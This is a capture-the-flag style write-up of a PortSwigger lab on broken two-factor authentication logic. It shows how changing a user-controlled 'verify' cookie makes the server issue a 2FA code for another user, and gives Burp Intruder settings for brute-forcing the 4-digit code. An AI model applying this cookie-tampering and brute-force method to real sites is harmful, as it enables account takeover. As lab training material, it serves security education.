# [Lab: 2FA broken logic](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic)

## Lab

This lab's two-factor authentication is vulnerable due to its flawed logic. To solve the lab, access Carlos's account page.

- Your credentials: `wiener`:`peter`
- Victim's username: `carlos`
You also have access to the email server to receive your 2FA verification code.

## Analysis

F2A flow:

```http
POST /login HTTP/1.1

username=wiener&password=peter

HTTP/1.1 302 Found
Location: /login2
Set-Cookie: verify=wiener; HttpOnly
```

```http
GET /login2 HTTP/1.1
Cookie: verify=wiener;

HTTP/1.1 200 OK
```

after request to `/login2`, the code is sent to mail. access email client and get code

```http
POST /login2 HTTP/1.1

mfa-code=1234
```

## Problems and exploit

1. the server will generate a f2a code if receive:

    ```http
    GET /login2 HTTP/1.1
    Cookie: verify=wiener;

    HTTP/1.1 200 OK
    ```

    - but the rerivy cookie is user controlled => we can force server to generate f2a code of another account

2. server no bruteforce defense: the f2a code is just a 4-digits number => we can bruteforce with 10000 payloads:

- mode: sniper
- positions:

  ```http
  POST /login2 HTTP/1.1

  mfa-code=§§
  ```

- payloads:
  - type: bruteforcer
  - character set: 0123456789
  - min length: 4
  - max length: 4
